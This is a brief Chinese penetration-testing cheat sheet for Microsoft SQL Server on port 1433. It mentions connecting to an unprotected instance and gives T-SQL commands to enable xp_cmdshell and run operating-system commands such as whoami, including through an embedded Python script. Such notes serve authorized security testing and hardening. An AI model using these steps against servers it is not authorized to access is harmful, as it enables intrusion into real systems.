# 1433 MSSQL

## MSSQL 未授权访问

如果 MSSQL 服务存在未授权访问，可以直接使用 Navicate Premium 等工具进行连接。

## MSSQL 命令执行

```bash
# 查看 xp_cmdshell 开启状态 0 closed / 1 open
EXEC sp_configure 'xp_cmdshell';

# 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# 禁用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

# 使用 xp_cmdshell 执行 whoami 命令
EXEC xp_cmdshell 'whoami';
EXEC dbName..xp_cmdshell 'whoami';

# 使用外部 Python 脚本执行 whoami 命令
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```
